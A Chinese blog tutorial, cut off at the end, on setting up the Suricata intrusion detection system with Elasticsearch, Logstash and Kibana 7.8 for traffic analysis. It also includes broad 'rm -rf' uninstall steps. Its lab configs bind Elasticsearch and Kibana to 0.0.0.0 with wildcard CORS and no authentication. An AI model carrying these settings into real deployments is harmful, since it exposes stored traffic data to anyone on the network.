部署架构</h1><p>整个架构如下表所示，有台机器装suricata用于分析流量，并装elk负责数据展示，后面数据量太大可能涉及elk集群，这里先不做考虑，仅仅自己实验。</p><table><thead><tr><th>机器</th><th>部署内容</th><th>IP</th></tr></thead><tbody><tr><td>流量分析和数据展示机器，称之为ids主机</td><td>ELK数据展示+suricata分析流量</td><td>多个集群</td></tr><tr><td>流量收集集群</td><td>抓取集群流量</td><td>10.0.0.1</td></tr></tbody></table><p>这个架构我们提供两种流量分析模式。</p><p>一种为在线模式：正常做法都是利用镜像流量，将所有集群抓取到的流量镜像到suricata机器，suricata实时在线处理这些流量,再elk展示出来。</p><p>二离线模式：但是因为机器是部署在阿里云上的，因此做镜像流量较困难，当然采用Amazon VPC功能可以实现镜像流量，如<a href="https://aws.amazon.com/cn/blogs/china/using-vpc-traffic-mirroring-to-construct-network-intrusion-detection-system-update/"> VPC Traffic Mirroring 构建网络入侵检测系统</a>文章，这里我们没有购买此产品，初步架构部署为离线模式。即流量收集集群将抓取的流量文件推送到suricata主机上，suricata -r分析流量文件包，产生log日志，然后elk将log数据展示出来。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1611038936479.png" alt="1611038936479"></p><h1 id="3-环境部署"><a href="#3-环境部署" class="headerlink" title="3 环境部署"></a>3 环境部署</h1><h2 id="3-1-suricata部署"><a href="#3-1-suricata部署" class="headerlink" title="3.1 suricata部署"></a>3.1 suricata部署</h2><p>suricata的安装教程看<a href="https://m01ly.github.io/2020/09/11/install-guide-suricata/">前文</a>，安装好suricata后，然后按照<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/_Logstash_Kibana_and_Suricata_JSON_output">官网suricata+elk部署指南</a>配置相关支持Elk属性即可。</p><h3 id="3-1-1-确认suricata安装了libjansson"><a href="#3-1-1-确认suricata安装了libjansson" class="headerlink" title="3.1.1 确认suricata安装了libjansson"></a>3.1.1 确认suricata安装了libjansson</h3><p>如下查看配置信息，确认  libjansson support:为yes即可</p><pre class="line-numbers language-bash"><code class="language-bash">$ suricata --build-infoThis is Suricata version 2.0 RELEASEFeatures: NFQ PCAP_SET_BUFF LIBPCAP_VERSION_MAJOR<span class="token operator">=</span>1 AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK HAVE_NSS HAVE_LIBJANSSON <span class="token punctuation">..</span>.  libnss support:                          <span class="token function">yes</span>  libnspr support:                         <span class="token function">yes</span>  libjansson support:                     --<span class="token operator">></span> <span class="token function">yes</span> <span class="token operator">&lt;</span>--  Prelude support:                         no  PCRE jit:                                no  libluajit:                               no  libgeoip:                                <span class="token function">yes</span>  Non-bundled htp:                         <span class="token function">yes</span>  Old barnyard2 support:                   no  CUDA enabled:                            no<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-修改配置文件"><a href="#3-1-2-修改配置文件" class="headerlink" title="3.1.2  修改配置文件"></a>3.1.2  修改配置文件</h3><p>修改配置文件suricata.yaml如下</p><pre class="line-numbers language-yaml"><code class="language-yaml">  <span class="token comment" spellcheck="true"># "United" event log in JSON format</span>  <span class="token punctuation">-</span> <span class="token key atrule">eve-log</span><span class="token punctuation">:</span>      <span class="token key atrule">enabled</span><span class="token punctuation">:</span> yes      <span class="token key atrule">type</span><span class="token punctuation">:</span> file <span class="token comment" spellcheck="true">#file|syslog|unix_dgram|unix_stream</span>      <span class="token key atrule">filename</span><span class="token punctuation">:</span> eve.json      <span class="token comment" spellcheck="true"># the following are valid when type: syslog above</span>      <span class="token comment" spellcheck="true">#identity: "suricata" </span>      <span class="token comment" spellcheck="true">#facility: local5</span>      <span class="token comment" spellcheck="true">#level: Info ## possible levels: Emergency, Alert, Critical,</span>                   <span class="token comment" spellcheck="true">## Error, Warning, Notice, Info, Debug</span>      <span class="token key atrule">types</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> alert        <span class="token punctuation">-</span> <span class="token key atrule">http</span><span class="token punctuation">:</span>            <span class="token key atrule">extended</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># enable this for extended logging information</span>        <span class="token punctuation">-</span> dns        <span class="token punctuation">-</span> <span class="token key atrule">tls</span><span class="token punctuation">:</span>            <span class="token key atrule">extended</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># enable this for extended logging information</span>        <span class="token punctuation">-</span> <span class="token key atrule">files</span><span class="token punctuation">:</span>            <span class="token key atrule">force-magic</span><span class="token punctuation">:</span> yes   <span class="token comment" spellcheck="true"># force logging magic on all logged files</span>            <span class="token key atrule">force-md5</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># force logging of md5 checksums</span>        <span class="token comment" spellcheck="true">#- drop</span>        <span class="token punctuation">-</span> ssh        <span class="token punctuation">-</span> smtp        <span class="token punctuation">-</span> flow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-安装ES"><a href="#3-2-安装ES" class="headerlink" title="3.2 安装ES"></a>3.2 安装ES</h2><h3 id="3-2-1-需要java-1-8-环境"><a href="#3-2-1-需要java-1-8-环境" class="headerlink" title="3.2.1 需要java 1.8 环境"></a>3.2.1 需要java 1.8 环境</h3><p>ES安装需要java1.8环境，因此需要先检查主机是否有java1.8环境。</p><p> <a href="http://www.justdojava.com/2019/08/11/elk-install/">http://www.justdojava.com/2019/08/11/elk-install/</a> </p><p><img src="/2020/09/11/install-guide-elk-suricata/1603867131448.png" alt="1603867131448"></p><p>（1）查看java版本：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">which</span> java<span class="token function">whereis</span> javajava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603862442212.png" alt="1603862442212"></p><p>（2）卸载旧版本（这里注意centos7自带的是1.8的jre，需要卸载掉/或者yum -y install java-1.8.0-openjdk安装的也仅仅是jre）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find / -name java</span>/etc/pki/ca-trust/extracted/java/etc/pki/java/etc/alternatives/java/etc/java/var/lib/alternatives/java/usr/bin/java/usr/lib/java/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java/usr/share/elasticsearch/jdk/bin/java/usr/share/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/ca-trust/extracted/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/elasticsearch/jdk/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）安装1.8版本java</p><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，而那个不带-devel的安装完了其实是jre。 </p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603870468396.png" alt="1603870468396"></p><p>（4）修改环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span class="token comment" spellcheck="true">#修改JAVA_HOME为jdk目录</span><span class="token keyword">echo</span> <span class="token variable">$JAVA_HOME</span><span class="token comment" spellcheck="true">#查看环境变量</span>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603868088313.png" alt="1603868088313"></p><p> 让profile文件立即生效 ，1.8java安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603867783946.png" alt="1603867783946"></p><h3 id="3-2-2安装"><a href="#3-2-2安装" class="headerlink" title="3.2.2安装"></a>3.2.2安装</h3><p><a href="https://www.elastic.co/cn/downloads/elasticsearch">官网下载</a></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-x86_64.rpmrpm -ivh elasticsearch-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603803405841.png" alt="1603803405841"></p><p>安装目录： 一般是装在/usr/share/elasticsearch/下。 </p><p>报错1：</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603866798862.png" alt="1603866798862"></p><p>解决办法：删除其他版本的java</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -name java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603866831066.png" alt="1603866831066"></p><p>版本太低 ，都删除，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /opt/jdk1.7.0_79/<span class="token function">sudo</span> <span class="token function">rm</span> -rf /opt/jdk1.8.0_60/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3设置data的目录"><a href="#3-2-3设置data的目录" class="headerlink" title="3.2.3设置data的目录"></a>3.2.3设置data的目录</h3><p>创建/data/es-data目录，用于elasticsearch数据的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/es-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为elasticsearch</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R elasticsearch:elasticsearch /data/es-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4设置log的目录"><a href="#3-2-4设置log的目录" class="headerlink" title="3.2.4设置log的目录"></a>3.2.4设置log的目录</h3><p>创建/data/es-log目录，用于elasticsearch日志的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /log/es-log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为elasticsearch</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R elasticsearch:elasticsearch /log/es-log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-5-修改配置文件elasticsearch-yml"><a href="#3-2-5-修改配置文件elasticsearch-yml" class="headerlink" title="3.2.5 修改配置文件elasticsearch.yml"></a>3.2.5 修改配置文件elasticsearch.yml</h3><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/elasticsearch/elasticsearch.yml<span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml#查看配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#设置data存放的路径为/data/es-data</span>path.data: /data/es-data<span class="token comment" spellcheck="true">#设置logs日志的路径为/log/es-log</span>path.logs: /log/es-log<span class="token comment" spellcheck="true">#设置内存不使用交换分区</span>bootstrap.memory_lock: <span class="token boolean">false</span><span class="token comment" spellcheck="true">#配置了bootstrap.memory_lock为true时反而会引发9200不会被监听，原因不明</span><span class="token comment" spellcheck="true">#设置允许所有ip可以连接该elasticsearch</span>network.host: 0.0.0.0<span class="token comment" spellcheck="true">#开启监听的端口为9200</span>http.port: 9200<span class="token comment" spellcheck="true">#节点名称</span>node.name: node-1<span class="token comment" spellcheck="true">#增加新的参数，为了让elasticsearch-head插件可以访问es (5.x版本，如果没有可以自己手动加)</span>http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-6启动elasticsearch"><a href="#3-2-6启动elasticsearch" class="headerlink" title="3.2.6启动elasticsearch"></a>3.2.6启动elasticsearch</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start elasticsearch<span class="token comment" spellcheck="true">#启动   </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出错1：</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603863067395.png" alt="1603863067395"></p><p>solution:配置文件加下面代码：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">bootstrap.system_call_filter</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token key atrule">cluster.initial_master_nodes</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"node-1"</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看状态</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status elasticsearch <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置开机启动</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> elasticsearch <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动成功之后，测试服务是否开启</p><pre class="line-numbers language-bash"><code class="language-bash">curl -X GET http://localhost:9200 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603805643890.png" alt="1603805643890"></p><h3 id="3-2-7-卸载"><a href="#3-2-7-卸载" class="headerlink" title="3.2.7 卸载"></a>3.2.7 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash">yum remove elasticsearch<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/elasticsearch/<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/elasticsearch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-3-logStash"><a href="#3-3-logStash" class="headerlink" title="3.3  logStash"></a>3.3  logStash</h2><h3 id="3-3-1-下载安装"><a href="#3-3-1-下载安装" class="headerlink" title="3.3.1 下载安装"></a>3.3.1 下载安装</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/logstash/logstash-7.8.0.rpmrpm -ivh logstash-7.8.0.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603805962140.png" alt="1603805962140"></p><h3 id="3-2-2设置data的目录"><a href="#3-2-2设置data的目录" class="headerlink" title="3.2.2设置data的目录"></a>3.2.2设置data的目录</h3><p>创建/data/ls-data目录，用于logstash数据的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/ls-data <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R logstash:logstash /data/ls-data <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-3设置log的目录"><a href="#3-3-3设置log的目录" class="headerlink" title="3.3.3设置log的目录"></a>3.3.3设置log的目录</h3><p>创建/data/ls-log目录，用于logstash日志的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R logstash:logstash /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-4设置conf-d的目录，创建配置文件"><a href="#3-3-4设置conf-d的目录，创建配置文件" class="headerlink" title="3.3.4设置conf.d的目录，创建配置文件"></a>3.3.4设置conf.d的目录，创建配置文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#进入logstash目录 </span><span class="token function">cd</span> /etc/logstash <span class="token comment" spellcheck="true">#创建conf.d的目录 </span><span class="token function">mkdir</span> conf.d <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建配置文件，日志内容输出到elasticsearch中，如下所示</p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/logstash/conf.d/logstash.conf<span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf<span class="token function">chown</span> root /etc/logstash/conf.d/logstash.conf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>logstash.conf 文件内容如下：注意其中的path为suricata日志：/var/log/suricata/eve.json</p><pre class="line-numbers language-yaml"><code class="language-yaml">input &amp;<span class="token comment" spellcheck="true">#123;</span>  file &amp;<span class="token comment" spellcheck="true">#123;</span>    path =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"/var/log/suricata/eve.json"</span><span class="token punctuation">]</span>    codec =<span class="token punctuation">></span> json  &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>filter &amp;<span class="token comment" spellcheck="true">#123;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>output &amp;<span class="token comment" spellcheck="true">#123;</span>  elasticsearch &amp;<span class="token comment" spellcheck="true">#123;</span>    hosts =<span class="token punctuation">></span> "127.0.0.1<span class="token punctuation">:</span>9200"    index =<span class="token punctuation">></span> "suricata<span class="token punctuation">-</span>%&amp;<span class="token comment" spellcheck="true">#123;+YYYY.MM.dd&amp;#125;"</span>  &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-5修改配置文件logstash-yml"><a href="#3-3-5修改配置文件logstash-yml" class="headerlink" title="3.3.5修改配置文件logstash.yml"></a>3.3.5修改配置文件logstash.yml</h3><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/logstash/logstash.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 设置数据的存储路径为/data/ls-data </span>path.data: /data/ls-data <span class="token comment" spellcheck="true"># 设置管道配置文件路径为/etc/logstash/conf.d </span>path.config: /etc/logstash/conf.d <span class="token comment" spellcheck="true"># 设置日志文件的存储路径为/log/ls-log </span>path.logs: /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-6启动logstash"><a href="#3-3-6启动logstash" class="headerlink" title="3.3.6启动logstash"></a>3.3.6启动logstash</h3><p>启动logstash命令如下，注意该命令不会指定配置文件启动。</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603951213781.png" alt="1603951213781"></p><p>查看</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置开机启动</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-7-测试logstash"><a href="#3-3-7-测试logstash" class="headerlink" title="3.3.7 测试logstash"></a>3.3.7 测试logstash</h3><p>–config.test_and_exit表示，检查测试创建的logstash.conf配置文件，是否有问题，如果没有问题，执行之后，<strong>显示Configuration OK 证明配置成功！</strong></p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash  -f /etc/logstash/conf.d/logstash.conf --config.test_and_exit <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**如果报错：WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using –path.settings. **</p><p>解决办法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/logstash <span class="token function">ln</span> -s /etc/logstash ./config <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试成功！</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603806572175.png" alt="1603806572175"></p><h3 id="3-3-8-logstash指定配置进行运行"><a href="#3-3-8-logstash指定配置进行运行" class="headerlink" title="3.3.8 logstash指定配置进行运行"></a>3.3.8 logstash指定配置进行运行</h3><p>指定logstash.conf配置文件，以后台的方式运用，执行这段命令之后，需要回车一下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查logstash是否启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示如下信息，说明启动了</p><p><img src="http://www.justdojava.com/assets/images/2019/java/image-jay/a29ab2058ff04df4bac898a8759f1a47.jpg" alt="img"></p><h3 id="3-3-9-卸载"><a href="#3-3-9-卸载" class="headerlink" title="3.3.9 卸载"></a>3.3.9 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/default/logstash \/etc/logstash \/var/lib/logstash \/var/log/logstash \/usr/share/logstash \/usr/share/kibana/x-pack/plugins/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/components/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/components/metricbeat_migration/instruction_steps/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/lib/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/views/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/lib/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/lib/metrics/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/routes/api/v1/logstash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-10"><a href="#3-3-10" class="headerlink" title="3.3.10"></a>3.3.10</h3><p>找错，查看logstash运行日志</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status logstash -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-4-kibana"><a href="#3-4-kibana" class="headerlink" title="3.4  kibana"></a>3.4  kibana</h2><h3 id="3-4-1-安装"><a href="#3-4-1-安装" class="headerlink" title="3.4.1 安装"></a>3.4.1 安装</h3><p> <a href="https://www.elastic.co/cn/downloads/kibana">官网下载kibaba7.8版本</a>  </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/kibana/kibana-7.8.0-x86_64.rpmrpm -ivh kibana-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603808067228.png" alt="1603808067228"></p><p>搜索rpm包</p><pre class="line-numbers language-bash"><code class="language-bash">rpm -ql kibana<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认是装在/usr/share/kibana/下。</p><h3 id="3-3-2修改kibana-yml"><a href="#3-3-2修改kibana-yml" class="headerlink" title="3.3.2修改kibana.yml"></a>3.3.2修改kibana.yml</h3><p>修改kibana的配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/kibana/kibana.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#kibana页面映射在5601端口 </span>server.port: 5601 <span class="token comment" spellcheck="true">#允许所有ip访问5601端口 </span>server.host: <span class="token string">"0.0.0.0"</span> <span class="token comment" spellcheck="true">#elasticsearch所在的ip及监听的地址 </span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://localhost:9200"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-3启动kibana"><a href="#3-4-3启动kibana" class="headerlink" title="3.4.3启动kibana"></a>3.4.3启动kibana</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl start kibana <span class="token comment" spellcheck="true">#启动</span>systemctl status kibana<span class="token comment" spellcheck="true">#查看状态</span>systemctl <span class="token function">enable</span> kibana<span class="token comment" spellcheck="true">#设置开机启动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>kibana启动成功的界面</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603808420430.png" alt="1603808420430"></p><h3 id="3-4-4-卸载"><a href="#3-4-4-卸载" class="headerlink" title="3.4.4 卸载"></a>3.4.4 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash">yum remove kibana<span class="token function">find</span> / -name kibana<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/kibana \/var/lib/kibana \/usr/share/elasticsearch/modules/kibana \/usr/share/kibana \/usr/share/logstash/modules/fb_apache/configuration/kibana \/usr/share/logstash/modules/netflow/configuration/kibana \/usr/share/logstash/x-pack/modules/arcsight/configuration/kibana \/usr/share/logstash/x-pack/modules/azure/configuration/kibana<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-相关配置总结"><a href="#3-5-相关配置总结" class="headerlink" title="3.5 相关配置总结"></a>3.5 相关配置总结</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">##suricata</span>/var/log/suricata/ <span class="token comment" spellcheck="true">#日志目录</span><span class="token comment" spellcheck="true">##elk日志目录log:</span><span class="token function">tail</span> -n 20  /var/log/messages <span class="token comment" spellcheck="true">##ES:/usr/share/elasticsearch</span>/usr/share/elasticsearch/bin/elasticsearch<span class="token comment" spellcheck="true">#安装目录</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml<span class="token function">vi</span> /etc/elasticsearch/elasticsearch.ymlpath.data: /var/lib/elasticsearchpath.logs: /var/log/elasticsearch<span class="token comment" spellcheck="true">##logstash:</span>/usr/share/logstash/bin/logstash<span class="token comment" spellcheck="true">#安装目录</span>path.data: /var/lib/logstashpipeline.ordered: autopath.logs: /var/log/logstash<span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/logstash/conf.d/logstash.conf/etc/logstash/logstash.yml <span class="token comment" spellcheck="true">##kibana:</span>/usr/share/kibana/bin/kibana<span class="token comment" spellcheck="true">#安装目录</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/kibana/kibana.yml <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-在线模式部署"><a href="#4-在线模式部署" class="headerlink" title="4 在线模式部署"></a>4 在线模式部署</h1><p>在线模式部署：即suricata实时处理其他机器镜像过来的流量。然后elk进行数据化展示。</p><p>依次开启kibana elasticsearch logstash，这里需要注意的是logstash不能采用默认开启方式systemctl start logstash，因为默认配置不加载/etc/logstash/conf.d/logstash.conf文件，则加载不成功suricata日志。具体命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start kibana logstash elasticsearchsystemctl start logstash<span class="token comment" spellcheck="true">#错误开启，不会加载配置文件/etc/logstash/conf.d/logstash.conf</span><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span class="token comment" spellcheck="true">#指定配置文件开启logstash  正确操作</span><span class="token function">sudo</span> <span class="token function">nohup</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal <span class="token operator">&amp;</span>  <span class="token comment" spellcheck="true">#启动suricata</span><span 